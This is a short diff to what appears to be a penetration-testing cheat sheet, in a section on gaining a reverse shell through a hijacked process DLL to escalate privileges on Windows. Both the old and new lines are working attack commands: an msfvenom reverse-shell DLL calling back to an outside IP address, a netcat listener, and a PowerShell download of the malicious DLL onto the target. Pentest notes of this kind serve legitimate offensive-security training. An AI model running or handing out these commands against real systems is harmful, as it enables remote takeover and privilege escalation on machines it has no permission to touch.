@@ -1203,9 +1203,9 @@ Get a reverse shell via a process dll to elevate privileges:
 
 ```console
 
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll lhost=222.222.222.222 lport=8888 -o EnterpriseServiceOptional.dll
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=222.222.222.222 LPORT=9999 -f dll -o EnterpriseServiceOptional.dll
 
-$ nc -nlvp 8888
+$ nc -nlvp 9999
 
 > iwr -uri http://192.168.45.245/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll
 ```
